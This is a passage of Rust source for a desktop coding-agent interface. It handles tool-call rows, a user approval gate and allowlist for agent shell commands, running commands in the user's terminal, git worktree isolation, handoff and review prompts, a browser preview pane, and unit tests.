            // The post below is the answer this call owed, so a stop from here
            // on has nothing left to unblock.
            if state.outstanding.as_deref() == Some(call_id.as_str()) {
                state.outstanding = None;
            }
            let c = client.clone();
            Task::perform(
                async move {
                    c.coder_tool_result(thread, &call_id, &result).await.map_err(|e| e.to_string())
                },
                Message::ToolPosted,
            )
        }
        // The turn is parked on a result that never arrives, and the stream
        // gives no sign of it — so say so rather than leave a spinner running
        // until the server's 300s timeout.
        Message::ToolPosted(Err(e)) => {
            state.sending = false;
            state.close_open_tools("the turn ended before this call was answered");
            state.error = Some(format!("Could not hand the tool result back: {e}"));
            Task::none()
        }
        Message::ToolPosted(Ok(())) => Task::none(),
        // The executor reports its own failures as text the model can act on,
        // so an `Error:` prefix is the only signal a call went wrong.
        Message::Event(CoderEvent::ToolResult { content, .. }) => {
            let failed = content.starts_with("Error:");
            let result = if failed { Err(content) } else { Ok(content) };
            state.resolve_tool(result);
            // Follow mode: the write has landed, so the file is worth opening.
            // Not on a failure — a write that did not happen has nothing to show,
            // and the row already says why.
            match state.following.take() {
                Some(path) if !failed => {
                    state.viewing = Some((path.clone(), crate::coder_files::read_capped(&path)));
                    state.dock = Dock::File;
                }
                _ => {}
            }
            iced::widget::operation::snap_to_end(transcript_id())
        }
        // No row here. The resumed turn emits a real `tool_call` for the very
        // same call, and a row pushed now would sit beside it as a duplicate —
        // seen on screen before it was seen in the code. The pending card is
        // what shows the command while the decision is outstanding.
        Message::Event(CoderEvent::ApprovalRequired { call_id, name, arguments }) => {
            // The server offers `run_command` whatever this session allows, so
            // with commands off the user was being asked to approve something
            // the executor would then refuse anyway — two gates, one answer.
            // Refuse it here and let the model read why.
            if !state.autonomy.allows_commands() {
                state.turns.push(Turn::Tool {
                    label: label_for(&name, &arguments),
                    result: Some(Err("commands are off for this session".into())),
                });
                let task = resume_after_decision(state, client, &call_id, false);
                state.refused_for_commands_off = true;
                return task;
            }
            let command = command_of(&arguments);
            // A rule the user wrote answers for them, and the turn never stops.
            // `Auto` should not reach here at all — the server is told not to
            // ask — but a tier changed mid-turn can, and the tier is the answer.
            // An unreadable call is never one of these: there is no command to
            // match a rule against, and the card refuses it on sight.
            if !command.is_empty()
                && match state.autonomy {
                    Autonomy::Auto => true,
                    Autonomy::Allowlist => allowed_by_rule(state.rules(), &command),
                    Autonomy::Off | Autonomy::Ask => false,
                }
            {
                state.auto_approved = Some(call_id.clone());
                return resume_after_decision(state, client, &call_id, true);
            }
            state.pending = Some(Pending { call_id, command });
            state.sending = false;
            iced::widget::operation::snap_to_end(transcript_id())
        }
        Message::Event(CoderEvent::Failed(e)) => {
            state.sending = false;
            state.close_open_tools("the turn ended before this call was answered");
            // A decision that never reached the server leaves the server still
            // holding the call: every later send comes back "thread has a
            // command awaiting approval". The card goes back up so the same
            // decision can be sent again, which is the only way out from here.
            state.error = Some(if state.resuming {
                state.resuming = false;
                format!("The decision did not reach the server ({e}). Answer it again.")
            } else {
                e
            });
            Task::none()
        }
        // `Done` also arrives right behind an approval pause — the route
        // returns rather than staying open — so the row waiting on that
        // decision is not one the turn failed to answer.
        Message::Event(CoderEvent::Done) => {
            state.sending = false;
            // The stream is over, so there is no handle left to abort.
            state.abort = None;
            state.outstanding = None;
            if state.pending.is_none() {
                state.close_open_tools("the turn ended before this call was answered");
                // A turn that ends having said nothing renders as nothing, which
                // is indistinguishable from a hang — and it is the *normal* way
                // a model too weak for a tool loop fails, not an edge case. The
                // server's resolved default is `llama3`, so this is the first
                // thing a new user hits.
                if !state.answered {
                    state.error = Some(if state.refused_for_commands_off {
                        "The command was not run — commands are off for this session. \
                         Turn them on in the header if the agent should be able to run \
                         things."
                            .into()
                    } else {
                        "The model ended the turn without replying. That usually means the \
                         model cannot hold a tool loop — pick a coding model in the header \
                         and try again."
                            .to_string()
                    });
                }
            }
            // Neither of these two ended with files changed: nothing ran, so
            // there is nothing to checkpoint, and the queue behind them is not
            // theirs to release — the plan's is waiting on the card, and the
            // handoff's belonged to the session being left.
            //
            // `answered` is the guard in both, not an empty `last_reply`: a turn
            // that said nothing would otherwise hand on the *previous* turn's
            // answer as if it were this one's.
            let said = state.answered.then(|| state.last_reply().trim().to_string());
            match std::mem::take(&mut state.kind) {
                TurnKind::Plan => {
                    if let Some(plan) = said.filter(|p| !p.is_empty()) {
                        state.plan_card = Some(text_editor::Content::with_text(&plan));
                    }
                    return Task::batch([
                        iced::widget::operation::snap_to_end(transcript_id()),
                        load_threads(state, client),
                    ]);
                }
                // The summary is the *next* session's first message, not this
                // one's — and it lands in the composer rather than being sent,
                // because a handoff nobody read is the restart tax with extra
                // steps. The old thread keeps the summary as its last row, which
                // is where anyone looking for it would look.
                TurnKind::Handoff => {
                    let Some(summary) = said.filter(|s| !s.is_empty()) else {
                        state.error = Some(
                            "The handoff came back empty, so the session was left alone. Try again, or start a new one and say where you got to."
                                .into(),
                        );
                        return load_threads(state, client);
                    };
                    let threads = load_threads(state, client);
                    reset_session(state);
                    state.draft = summary;
                    return threads;
                }
                TurnKind::Work | TurnKind::Review => {}
            }
            // The turn is the one thing that changes these files behind the
            // user's back, so the pane is re-walked when it ends.
            state.refresh_tree();
            // A turn parked on the approval gate is not over — its command has
            // not run yet, so committing here would checkpoint half of it, and
            // the queue behind it is still waiting on this turn.
            let checkpoint = match (state.pending.is_none(), state.root.clone()) {
                (true, Some(root)) => {
                    // The queue advances off this commit rather than from here —
                    // see [`State::drain_queued`].
                    state.drain_queued = true;
                    let message = state.in_flight.clone();
                    Task::perform(
                        async move { crate::coder_git::commit_all(&root, &message).await },
                        Message::Committed,
                    )
                }
                _ => Task::none(),
            };
            // The server names a thread from its first turn and reorders the
            // list by recency, so the sidebar is refetched when a turn lands
            // rather than guessed at locally.
            return Task::batch([
                iced::widget::operation::snap_to_end(transcript_id()),
                load_threads(state, client),
                checkpoint,
            ]);
        }

        Message::Decide(approve) => {
            // Cloned, not taken: the call stays pending until the server acts on
            // the decision — see [`State::resuming`].
            let (Some(pending), Some(thread)) = (state.pending.clone(), state.thread_id) else {
                return Task::none();
            };
            if !approve {
                // No row exists for a refused call — none was ever pushed and
                // the resumed turn will not emit one — so this adds it.
                state.turns.push(Turn::Tool {
                    // An unreadable call has no command to name, and a bare `$`
                    // is a row that says nothing.
                    label: if pending.command.is_empty() {
                        "run_command (unreadable)".to_string()
                    } else {
                        format!("$ {}", pending.command)
                    },
                    result: Some(Err("refused by the user".into())),
                });
            }
            let _ = thread;
            resume_after_decision(state, client, &pending.call_id, approve)
        }

        Message::ToggleTool(idx) => {
            if !state.open_tools.remove(&idx) {
                state.open_tools.insert(idx);
            }
            Task::none()
        }
        // Isolation is a property of the *checkout*, so it is one swap of
        // `root` and nothing else changes: the tools already resolve against
        // it, the tree already walks it, the checkpoints already live in it.
        Message::ToggleWorktree(on) => {
            if state.sending {
                return Task::none();
            }
            if !on {
                // Back to the project. The checkout stays on disk — dropping it
                // would throw away work the user has not merged.
                if let Some(main) = state.main_root.take() {
                    state.root = Some(main);
                    state.refresh_tree();
                }
                return Task::none();
            }
            let Some(root) = state.root.clone().filter(|_| state.main_root.is_none()) else {
                return Task::none();
            };
            // Named by the clock rather than by the thread: isolation is worth
            // choosing *before* the first turn, and there is no thread yet then.
            let name = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_secs().to_string())
                .unwrap_or_else(|_| "session".to_string());
            Task::perform(
                async move { crate::coder_git::worktree_add(&root, &name).await },
                Message::WorktreeReady,
            )
        }
        Message::WorktreeReady(Ok(worktree)) => {
            state.main_root = state.root.replace(worktree);
            state.error = None;
            state.refresh_tree();
            Task::none()
        }
        Message::WorktreeReady(Err(e)) => {
            state.error = Some(format!("Could not make an isolated checkout: {e}"));
            Task::none()
        }
        Message::MergeBack => {
            let (Some(main), Some(worktree)) = (state.main_root.clone(), state.root.clone()) else {
                return Task::none();
            };
            Task::perform(
                async move { crate::coder_git::worktree_merge(&main, &worktree).await },
                Message::MergedBack,
            )
        }
        Message::MergedBack(Ok(())) => {
            state.error = None;
            Task::none()
        }
        Message::MergedBack(Err(e)) => {
            state.error = Some(format!("Could not merge that session back: {e}"));
            Task::none()
        }
        // Amp's `/handoff`, and the thing it is actually for: a thread that has
        // been going long enough to be expensive is also one whose context is
        // mostly dead ends. Restarting by hand means re-typing everything the
        // model already knows; this asks it to write that down first.
        Message::Fork => {
            if state.would_queue() || state.thread_id.is_none() {
                return Task::none();
            }
            start_turn(state, client, HANDOFF_ASK.to_string(), TurnKind::Handoff)
        }
        // The board owns these four; they are in this enum because the whole
        // screen speaks one message type. `New` is one of them because a new
        // session is a session *beside* this one now — see
        // [`crate::coder_board`].
        Message::New
        | Message::For(..)
        | Message::SelectSession(_)
        | Message::CloseSession(_) => Task::none(),
        Message::LinkClicked(url) => {
            if url.starts_with("http://") || url.starts_with("https://") {
                crate::shell::reveal_path(&url);
            }
            Task::none()
        }
        Message::DismissError => {
            state.error = None;
            Task::none()
        }

        // --- preview pane ----------------------------------------------------
        Message::ToggleBrowser => {
            state.browser_open = !state.browser_open;
            if !state.browser_open {
                return crate::coder_browser::run(
                    crate::coder_browser::Cmd::Hide,
                    Message::BrowserDone,
                );
            }
            // Nothing to show yet means *no child window at all*, not a blank
            // one: a webview over the empty pane is transparent until it paints
            // and still swallows every click, so the pane's own button would be
            // unpressable. Seen live.
            let url = if state.browser_url.is_empty() {
                normalize_url(&state.browser_draft)
            } else {
                Some(state.browser_url.clone())
            };
            // Reopening returns to the page it was on.
            let Some(url) = url else { return Task::none() };
            state.browser_url = url.clone();
            state.browser_draft = url.clone();
            crate::coder_browser::run(crate::coder_browser::Cmd::Load(url), Message::BrowserDone)
        }
        Message::BrowserOpenDefault => {
            state.browser_draft = crate::coder_browser::DEFAULT_URL.to_string();
            Task::done(Message::BrowserGo)
        }
        Message::BrowserUrlChanged(v) => {
            state.browser_draft = v;
            Task::none()
        }
        Message::BrowserGo => {
            let Some(url) = normalize_url(&state.browser_draft) else { return Task::none() };
            state.browser_url = url.clone();
            state.browser_draft = url.clone();
            state.browser_open = true;
            crate::coder_browser::run(crate::coder_browser::Cmd::Load(url), Message::BrowserDone)
        }
        Message::BrowserBack => {
            crate::coder_browser::run(crate::coder_browser::Cmd::Back, Message::BrowserDone)
        }
        Message::BrowserForward => {
            crate::coder_browser::run(crate::coder_browser::Cmd::Forward, Message::BrowserDone)
        }
        Message::BrowserReload => {
            crate::coder_browser::run(crate::coder_browser::Cmd::Reload, Message::BrowserDone)
        }
        Message::BrowserSync => {
            // No page, no child window to move — see `ToggleBrowser`.
            if !state.browser_open || state.browser_url.is_empty() {
                return Task::none();
            }
            crate::coder_browser::run(crate::coder_browser::Cmd::Show, Message::BrowserDone)
        }
        Message::BrowserHide => {
            // The pane stays "open" as far as the screen is concerned — this is
            // the child window being taken off a screen it would otherwise
            // float over, not the user closing anything.
            crate::coder_browser::run(crate::coder_browser::Cmd::Hide, Message::BrowserDone)
        }
        Message::BrowserDone(Ok(())) => {
            state.error = None;
            Task::none()
        }
        Message::BrowserDone(Err(e)) => {
            state.browser_open = false;
            state.error = Some(e);
            Task::none()
        }
    }
}

/// What to hand the preview for what the user typed. `None` for an empty box —
/// there is nothing to navigate to, and a blank submit should not blank the page.
///
/// A bare `localhost:5173` or `127.0.0.1:8080` is the whole point of this pane,
/// and neither is a URL until it has a scheme, so one is added. Anything already
/// carrying a scheme is passed through untouched.
fn normalize_url(draft: &str) -> Option<String> {
    let draft = draft.trim();
    if draft.is_empty() {
        return None;
    }
    if draft.contains("://") || draft.starts_with("about:") {
        return Some(draft.to_string());
    }
    Some(format!("http://{draft}"))
}

/// Answer a paused `run_command` and pick the turn back up. Two callers: the
/// user's decision, and the automatic refusal when commands are off for the
/// session — both have to resume the stream, or the turn is simply abandoned.
fn resume_after_decision(
    state: &mut State,
    client: &Client,
    call_id: &str,
    approve: bool,
) -> Task<Message> {
    let Some(thread) = state.thread_id else { return Task::none() };
    // `pending` stays until the server acts on this — see [`State::resuming`].
    state.resuming = true;
    state.sending = true;
    state.answered = false;
    state.stopped = false;
    state.elapsed = 0;
    let some_if_set = |s: &str| (!s.trim().is_empty()).then(|| s.to_string());
    let body = serde_json::json!({
        "thread_id": thread,
        "call_id": call_id,
        "approve": approve,
        "delegate_tools": true,
        // Same for the tool list: the resumed turn takes what this request
        // carries, so a decision made mid-turn would otherwise cost the model
        // the checklist tool it had before the gate.
        "tools": turn_tools(state),
        // The resumed turn rebuilds the system prompt from scratch, so the notes
        // have to be sent again — a turn that knew the workspace before the
        // approval gate and not after is one the gate silently lobotomised.
        "mode_instruction": mode_instruction(state),
        "provider": some_if_set(&state.provider),
        "model": some_if_set(&state.model),
    });
    let (stream, handle) =
        Task::run(coder_stream(client.clone(), "/api/v1/coder/chat/approve", body), Message::Event)
            .abortable();
    state.abort = Some(handle);
    stream
}

/// The system-prompt block for this turn: what the agent already knows about
/// the workspace, plus what this particular turn is for. `None` with no folder
/// open, which is also the only case where there is nothing it could be about.
///
/// Read off disk per turn rather than cached: the agent rewrites the notes file
/// mid-session and the user may edit it under us, and re-reading four kilobytes
/// is cheaper than either of those going unnoticed.
///
/// Capped as a whole, not per part: the server's 4096 is on the field, and a
/// 422 here is not a degraded turn, it is no turn at all.
fn mode_instruction(state: &State) -> Option<String> {
    let root = state.root.as_deref()?;
    let mut block = crate::coder_notes::block(root);
    // The project's rules go in after the agent's own notes and before the ask:
    // last thing written is the thing a model weights hardest, and the turn's
    // own instruction has to be the last thing.
    if let Some(agents) = crate::coder_notes::agents_block(root) {
        block.push_str(&agents);
    }
    if state.kind == TurnKind::Plan {
        block.push_str(PLAN_GATE_ASK);
    }
    Some(block.chars().take(MAX_MODE_INSTRUCTION).collect())
}

/// A fresh conversation in the same folder, with everything around the
/// conversation carried over and nothing of the conversation itself.
///
/// Clones rather than moves because it has two shapes of caller: the handoff
/// replaces the session it is called on ([`reset_session`]), and the board opens
/// a second one beside it — same folder, same model, same rules, its own thread.
pub fn fresh_from(state: &State) -> State {
    State {
        root: state.root.clone(),
        // A new conversation in the same checkout, isolated or not — the
        // worktree belongs to the folder the user is working in, not to the
        // thread that happened to make it.
        main_root: state.main_root.clone(),
        git_repo: state.git_repo,
        // The chip is the folder's fact, not the thread's; recomputing it costs
        // a `refresh_tree` the new session has no other reason to run.
        agents_md: state.agents_md,
        autonomy: state.autonomy,
        allowlist: state.allowlist.clone(),
        plan_mode: state.plan_mode,
        follow: state.follow,
        catalog: state.catalog.clone(),
        provider: state.provider.clone(),
        model: state.model.clone(),
        threads: state.threads.clone(),
        // A new *conversation*, not a new folder: the file history and the tree
        // are the folder's, and outlive any session in it.
        checkpoints: state.checkpoints.clone(),
        files_open: state.files_open,
        pane: state.pane,
        dock: state.dock,
        browser_open: state.browser_open,
        browser_url: state.browser_url.clone(),
        browser_draft: state.browser_draft.clone(),
        tree: state.tree.clone(),
        expanded: state.expanded.clone(),
        ..State::default()
    }
}

/// Start a new conversation in place — the handoff, which is the New button with
/// the old session's summary already typed into it.
fn reset_session(state: &mut State) {
    *state = fresh_from(state);
}

/// What the handoff turn asks for. It is a message rather than a
/// `mode_instruction` for the same reason the review's is: a reopened session
/// should show what was asked, and this row is the last thing in a thread that
/// is being retired.
const HANDOFF_ASK: &str = "Write a handoff for a fresh session picking this work up. Cover: what we are trying to do, what is already done, what is left, the files that matter, and anything you learned the hard way. Write it as instructions to whoever continues, not as a report to me — someone with none of this conversation has to be able to carry on from it alone.";

/// What the review pass asks for. Sent as the message rather than in
/// `mode_instruction`: the diff has to be in it, and the row a reopened session
/// rebuilds should say what was asked and about what.
const REVIEW_ASK: &str = "Review this diff of the changes that were just made. Look for bugs, for anything the task asked for that is missing, and for anything that breaks this project's own rules. Be specific — name the file and the line. If it is sound, say so in one line rather than inventing something.";

/// How much of a patch the review turn carries. The server fits a conversation
/// to the window by dropping *history*, so one message big enough to need that
/// costs the thread its memory of the turn being reviewed.
const MAX_REVIEW_CHARS: usize = 48_000;

/// What the gate's first turn is for. It rides in the system prompt rather than
/// on the message so the transcript keeps showing what the user actually typed
/// — the row a reopened session rebuilds is the message that was sent.
const PLAN_GATE_ASK: &str = "

For this turn, write the plan and nothing else: numbered steps, the files you expect to read or change, and what you will check when it is done. At most five steps, no code. You have no tools this turn. The user reads it, edits it, and hands it back before anything runs.";

/// The tool list this turn advertises. Empty for the gate's plan turn — the
/// protocol reads `[]` as "no tools", which is the only thing that actually
/// stops a model from editing while it is supposed to be planning.
fn turn_tools(state: &State) -> Vec<serde_json::Value> {
    if state.kind.tool_free() {
        Vec::new()
    } else {
        crate::coder_tools::tool_specs()
    }
}

/// Begin a turn for `prompt`: the row, the baseline, then the stream.
///
/// Three callers — the composer, the plan card's Run and the review pass — and
/// the ordering is why this is one function rather than three copies: the
/// baseline commit has to be taken **before** the first tool writes anything, or
/// that turn's own changes land in it and the checkpoint shows the turn as
/// having changed nothing.
fn start_turn(
    state: &mut State,
    client: &Client,
    prompt: String,
    kind: TurnKind,
) -> Task<Message> {
    let Some(root) = state.root.clone() else { return Task::none() };
    // One turn per checkout at a time — see [`State::busy_roots`]. Said rather
    // than queued: the other session is somebody else's window on this screen,
    // and a turn that starts minutes later without being asked for again is
    // worse than one that did not start.
    if state.busy_roots.contains(&root) {
        state.error = Some(
            "Another session is running a turn in this folder. Wait for it, or run this one in its own checkout with Isolate."
                .into(),
        );
        return Task::none();
    }
    // The row and the message are the same string, mentions and all — see
    // [`expand_mentions`]. Not for a review: that prompt is a diff this screen
    // built, and `@@ -1,7 +1,7 @@` is not somebody pointing at a file.
    let prompt = match kind {
        TurnKind::Review | TurnKind::Handoff => prompt,
        TurnKind::Work | TurnKind::Plan => expand_mentions(&root, &prompt),
    };
    state.turns.push(Turn::User(prompt.clone()));
    state.sending = true;
    state.kind = kind;
    state.error = None;
    state.answered = false;
    state.refused_for_commands_off = false;
    state.stopped = false;
    // Whatever the *last* turn changed is no longer what "review the changes"
    // would mean.
    state.last_turn = None;
    state.elapsed = 0;
    state.in_flight = prompt;

    let turn = match state.thread_id {
        Some(_) => send_turn(state, client),
        None => {
            let c = client.clone();
            let path = root.display().to_string();
            Task::perform(
                async move {
                    c.create_coder_thread(&path)
                        .await
                        .map(|t| t.thread_id)
                        .map_err(|e| e.to_string())
                },
                Message::ThreadOpened,
            )
        }
    };
    // Chained, not batched — see above. It is one `rev-parse` once the repo
    // exists.
    Task::perform(async move { crate::coder_git::ensure_repo(&root).await }, Message::Baselined)
        .chain(turn)
}

/// Run the agent's command in the drawer the user can see.
///
/// `None` when it cannot be done — no folder, or the terminal would not open —
/// and the caller falls back to the headless executor, which is what this
/// screen did for every command before now.
///
/// The command is written into the *user's* shell, so two things follow. The
/// dock switches to it, because a command running somewhere the user is not
/// looking is the spinner this replaces; and the row says where it went, since
/// otherwise a command whose output arrives from an unfamiliar place looks like
/// the agent's, not theirs.
fn start_in_terminal(state: &mut State, call_id: &str, command: &str) -> Option<Task<Message>> {
    // The mark rides in a shell string, so it is the call id with anything a
    // shell could read stripped out of it.
    let mark: String = call_id.chars().filter(char::is_ascii_alphanumeric).take(16).collect();
    if mark.is_empty() {
        return None;
    }
    let focus = match state.term.is_some() {
        true => Task::none(),
        false => state.open_terminal(),
    };
    let session = state.term.as_mut()?;
    crate::coder_term::send_line(session, &crate::coder_term::wrap(&mark, command));
    if let Some(Turn::Tool { label, result: None }) = state.turns.last_mut() {
        label.push_str(" — in the terminal");
    }
    state.term_run = Some(TermRun { call_id: call_id.to_string(), mark, waited: 0 });
    state.dock = Dock::Terminal;
    Some(Task::batch([focus, iced::widget::operation::snap_to_end(transcript_id())]))
}

/// Watch the drawer for the end of the agent's command, once a second.
///
/// Every path out of here answers the call or keeps waiting — the server is
/// blocked on it, so a poll that quietly gives up stalls the turn for the full
/// delegation timeout.
fn poll_terminal_run(state: &mut State) -> Task<Message> {
    let Some(run) = state.term_run.as_mut() else { return Task::none() };
    run.waited += 1;
    let (mark, call_id, waited) = (run.mark.clone(), run.call_id.clone(), run.waited);

    // The drawer was closed under it. The shell went with it, so nothing is ever
    // going to write the closing marker.
    let Some(session) = state.term.as_ref() else {
        state.term_run = None;
        return Task::done(Message::ToolRan {
            call_id,
            result: "(the terminal was closed before the command finished)".into(),
        });
    };
    if let Some(out) = crate::coder_term::scrape(&crate::coder_term::text(session), &mark) {
        state.term_run = None;
        let mut text = match out.text.trim().is_empty() {
            true => "(no output)".to_string(),
            false => out.text,
        };
        if out.code != 0 {
            text.push_str(&format!("
(exit code {})", out.code));
        }
        return Task::done(Message::ToolRan {
            call_id,
            result: crate::assistant::cap_output(text),
        });
    }
    if waited >= TERM_RUN_TIMEOUT {
        state.term_run = None;
        // Not killed: it is in the user's shell and it is theirs to stop. The
        // model is told where it went rather than that it vanished.
        return Task::done(Message::ToolRan {
            call_id,
            result: format!(
                "(timed out after {TERM_RUN_TIMEOUT}s — the command is still running in the terminal)"
            ),
        });
    }
    Task::none()
}

/// Inline every `@path` the message mentions, so the model reads the file it
/// was pointed at instead of spending a `read_file` round trip finding out it
/// was pointed at one.
///
/// The expanded text is what gets sent **and** what goes in the transcript row:
/// the persisted message is the expanded one, and a row that showed only what
/// was typed would not survive a reopen. [`crate::coder_view`] hides the tail
/// behind [`MENTION_MARKER`] so the row still reads as a sentence.
///
/// Silent about what it could not find: an `@` in prose ("email @ me") is not a
/// missing file, and a message that half-fails to send because of an address is
/// worse than one that quietly inlines nothing.
fn expand_mentions(root: &std::path::Path, prompt: &str) -> String {
    let mut seen: Vec<String> = Vec::new();
    let mut out = String::new();
    let mut budget = MAX_MENTION_BYTES;
    for token in prompt.split_whitespace().filter_map(|t| t.strip_prefix('@')) {
        // Trailing punctuation belongs to the sentence, not to the path.
        let rel = token.trim_end_matches([',', '.', ';', ':', ')', '?', '!']);
        if rel.is_empty() || seen.iter().any(|s| s == rel) {
            continue;
        }
        let Ok(path) = crate::coder_tools::resolve_in_root(root, rel) else { continue };
        if !path.is_file() {
            continue;
        }
        let Ok(text) = crate::coder_files::read_capped(&path) else { continue };
        if text.len() > budget {
            continue;
        }
        budget -= text.len();
        seen.push(rel.to_string());
        out.push_str(&format!("
`{rel}`:
```
{text}
```
"));
    }
    match out.is_empty() {
        true => prompt.to_string(),
        false => format!("{prompt}{MENTION_MARKER}{out}"),
    }
}

/// The approved plan, written where the user can open it in their own editor.
/// Best effort: this is a convenience beside the turn, not part of it, and a
/// read-only workspace must not cost the turn.
fn write_plan_file(root: &std::path::Path, plan: &str) {
    let dir = root.join(".agent");
    if std::fs::create_dir_all(&dir).is_ok() {
        let _ = std::fs::write(dir.join("plan.md"), plan);
    }
}

/// Start the streamed turn for `state.in_flight`.
///
/// `delegate_tools` is what puts the filesystem on this machine.
/// `auto_approve_commands` is [`Autonomy::Auto`] and nothing else: below that
/// tier the server pauses on every command, and the allowlist answers the pause
/// here rather than server-side — the rules are the desktop's, and a server that
/// pre-approved them would be trusting a list it cannot see.
fn send_turn(state: &mut State, client: &Client) -> Task<Message> {
    let some_if_set = |s: &str| (!s.trim().is_empty()).then(|| s.to_string());
    let body = serde_json::json!({
        "message": state.in_flight,
        "thread_id": state.thread_id,
        "workspace_root": state.root.as_ref().map(|p| p.display().to_string()),
        "allow_commands": state.autonomy.allows_commands(),
        "auto_approve_commands": state.autonomy == Autonomy::Auto,
        "delegate_tools": true,
        // The gate plans in a turn of its own, so the server's own PLAN step is
        // only for [`PlanMode::Inline`] — asking for both would plan twice.
        "plan": state.plan_mode == PlanMode::Inline,
        "tools": turn_tools(state),
        // The server merges this into the system prompt rather than storing it
        // as a message, so the notes never accumulate in the thread history —
        // one copy per turn, always the current file.
        "mode_instruction": mode_instruction(state),
        "provider": some_if_set(&state.provider),
        "model": some_if_set(&state.model),
    });
    // Abortable so the turn can actually be stopped — see [`Message::Stop`],
    // which drops this handle only *after* answering whatever call the server is
    // parked on.
    let (stream, handle) =
        Task::run(coder_stream(client.clone(), "/api/v1/coder/chat/stream", body), Message::Event)
            .abortable();
    state.abort = Some(handle);
    Task::batch([iced::widget::operation::snap_to_end(transcript_id()), stream])
}

#[cfg(test)]
mod tests {
    use super::*;

    fn client() -> Client {
        Client::new("http://127.0.0.1:1", "k")
    }

    fn open_state() -> State {
        State { thread_id: Some(7), ..State::with_root("D:/work/demo") }
    }

    /// What people type into a preview bar is a port, not a URL.
    #[test]
    fn the_preview_bar_takes_what_a_dev_server_prints() {
        assert_eq!(normalize_url("localhost:5173").as_deref(), Some("http://localhost:5173"));
        assert_eq!(normalize_url(" 127.0.0.1:8080 ").as_deref(), Some("http://127.0.0.1:8080"));
        // Already a URL: passed through, scheme and all.
        assert_eq!(normalize_url("https://example.com").as_deref(), Some("https://example.com"));
        assert_eq!(normalize_url("about:blank").as_deref(), Some("about:blank"));
        // An empty submit must not blank the page that is up.
        assert_eq!(normalize_url("   "), None);
    }

    /// The dock draws the selected tab only while that tab still has something
    /// behind it. Closing the open file with its tab selected has to land on
    /// the terminal, not on an empty panel.
    #[test]
    fn the_dock_falls_back_to_a_tab_that_still_has_content() {
        let mut s = open_state();
        assert_eq!(s.dock_shown(), None, "no dock until something opens");

        s.reviewing = Some(("abc".into(), None));
        assert_eq!(s.dock_shown(), Some(Dock::Diff), "the only tab wins whatever is selected");

        s.viewing = Some((PathBuf::from("a.rs"), Ok(String::new())));
        s.dock = Dock::File;
        assert_eq!(s.dock_shown(), Some(Dock::File));

        s.viewing = None;
        assert_eq!(s.dock_shown(), Some(Dock::Diff), "selection gone, first live tab instead");
    }

    /// The rail and the persisted `files_open` flag are one fact; the tree is
    /// walked exactly while the Files pane is the one on screen.
    #[test]
    fn switching_the_sidebar_starts_and_stops_the_tree_walk() {
        let root = std::env::temp_dir().join("coder-pane-switch-test");
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(root.join("a.rs"), "fn main() {}").unwrap();
        let mut s = State::with_root(root.to_str().unwrap());

        let _ = update(&mut s, &client(), Message::SelectPane(Pane::Files));
        assert!(s.files_open, "the persisted flag follows the rail");
        assert_eq!(s.tree.len(), 1);

        let _ = update(&mut s, &client(), Message::SelectPane(Pane::Checkpoints));
        assert!(!s.files_open);
        assert!(s.tree.is_empty(), "a hidden tree is not kept warm");
    }

    #[test]
    fn a_send_needs_a_folder_and_a_prompt() {
        let mut s = State { draft: "hello".into(), ..State::default() };
        let _ = update(&mut s, &client(), Message::Send);
        assert!(s.turns.is_empty(), "no folder open, nothing to code against");

        let mut s = State { draft: "   ".into(), ..open_state() };
        let _ = update(&mut s, &client(), Message::Send);
        assert!(s.turns.is_empty());

        let mut s = State { draft: "hello".into(), ..open_state() };
        let _ = update(&mut s, &client(), Message::Send);
        assert!(matches!(s.turns[0], Turn::User(ref t) if t == "hello"));
        assert!(s.draft.is_empty());
        assert!(s.sending);
    }

    #[test]
    fn a_tool_call_opens_a_row_and_its_result_closes_that_row() {
        let mut s = open_state();
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ToolCall {
                call_id: "c1".into(),
                name: "read_file".into(),
                arguments: serde_json::json!({ "path": "src/a.rs" }),
            }),
        );
        assert!(matches!(&s.turns[0], Turn::Tool { label, result: None } if label == "read_file src/a.rs"));
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ToolResult {
                name: "read_file".into(),
                content: "fn main() {}".into(),
            }),
        );
        assert!(
            matches!(&s.turns[0], Turn::Tool { result: Some(Ok(r)), .. } if r == "fn main() {}")
        );
    }

    /// The executor hands failures back as text the model can act on, so the
    /// `Error:` prefix is the only thing that distinguishes one — and a row
    /// showing a green tick over "File not found" is a lie.
    #[test]
    fn an_executor_error_reads_as_a_failed_row() {
        let mut s = open_state();
        tool_call(&mut s, "nope.rs");
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ToolResult {
                name: "read_file".into(),
                content: "Error: File not found: nope.rs".into(),
            }),
        );
        assert!(matches!(&s.turns[0], Turn::Tool { result: Some(Err(_)), .. }));
    }

    fn tool_call(state: &mut State, path: &str) {
        let _ = update(
            state,
            &client(),
            Message::Event(CoderEvent::ToolCall {
                call_id: path.into(),
                name: "read_file".into(),
                arguments: serde_json::json!({ "path": path }),
            }),
        );
    }

    /// Each answered row's text, whichever side of the `Result` it came back on.
    fn results(state: &State) -> Vec<String> {
        state
            .turns
            .iter()
            .filter_map(|t| match t {
                Turn::Tool { result: Some(r), .. } => {
                    Some(r.clone().unwrap_or_else(|e| e))
                }
                _ => None,
            })
            .collect()
    }

    #[test]
    fn results_fill_the_oldest_unanswered_row() {
        let mut s = open_state();
        tool_call(&mut s, "a.rs");
        tool_call(&mut s, "b.rs");
        s.resolve_tool(Ok("first".into()));
        s.resolve_tool(Ok("second".into()));
        assert_eq!(results(&s), vec!["first", "second"], "in call order, not reversed");
    }

    #[test]
    fn a_turn_that_dies_mid_call_cannot_swallow_the_next_turns_result() {
        let mut s = State { sending: true, ..open_state() };
        tool_call(&mut s, "a.rs");
        // The turn dies before that call is ever answered.
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Failed("boom".into())));
        assert_eq!(results(&s), vec!["the turn ended before this call was answered"]);

        // A fresh turn's result must land on the fresh row.
        tool_call(&mut s, "b.rs");
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ToolResult {
                name: "read_file".into(),
                content: "contents of b".into(),
            }),
        );
        assert_eq!(
            results(&s),
            vec!["the turn ended before this call was answered", "contents of b"]
        );
    }

    /// Stopping mid-call has to leave the screen in a state the *next* send can
    /// use: the row closed saying who closed it, the pending decision gone, and
    /// nothing left claiming the server owes this machine anything.
    #[test]
